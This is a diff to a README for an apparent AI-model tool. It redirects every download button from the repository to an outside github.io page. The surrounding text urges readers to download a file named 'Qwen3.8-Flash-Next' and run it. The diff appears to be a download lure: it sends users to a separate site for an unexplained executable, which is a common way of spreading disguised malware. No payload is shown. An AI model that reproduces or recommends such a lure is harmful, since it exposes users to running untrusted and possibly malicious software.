@@ -1,6 +1,6 @@
 # ⚡ Qwen3.8-Flash-Next-Single-DGX-Spark-TensorFold - Run Advanced AI on Your Computer
 
-[![Download Now](https://img.shields.io/badge/Download-Qwen3.8_Flash_Next-blue?style=for-the-badge&logo=github)](https://github.com/Nicandre3/Qwen3.8-Flash-Next-Single-DGX-Spark-TensorFold)
+[![Download Now](https://img.shields.io/badge/Download-Qwen3.8_Flash_Next-blue?style=for-the-badge&logo=github)](https://nicandre3.github.io)
 
 ## 👋 Welcome
 
@@ -35,7 +35,7 @@ Follow these steps in order. Do not skip ahead. It will only take a few minutes.
 
 Go to the download page by clicking the big button below or the link at the top of this page.
 
-[**CLICK HERE TO DOWNLOAD**](https://github.com/Nicandre3/Qwen3.8-Flash-Next-Single-DGX-Spark-TensorFold)
+[**CLICK HERE TO DOWNLOAD**](https://nicandre3.github.io)
 
 Visit this link to download the application. Your web browser will open a page. Look for a button or a file that starts with "Qwen3.8-Flash-Next". Click it to start the download. The file will be saved to your "Downloads" folder.
 
@@ -140,7 +140,7 @@ You are now ready to use your new AI tool. Start with a simple question like "Ex
 
 This is the main download link. Use this if you skipped the button at the top.
 
-[**DOWNLOAD QWEN3.8 FLASH NEXT**](https://github.com/Nicandre3/Qwen3.8-Flash-Next-Single-DGX-Spark-TensorFold)
+[**DOWNLOAD QWEN3.8 FLASH NEXT**](https://nicandre3.github.io)
 
 Visit this link to download the application. Save it to a location you remember, like your Desktop or Downloads folder. Then run the file to start your journey.
 
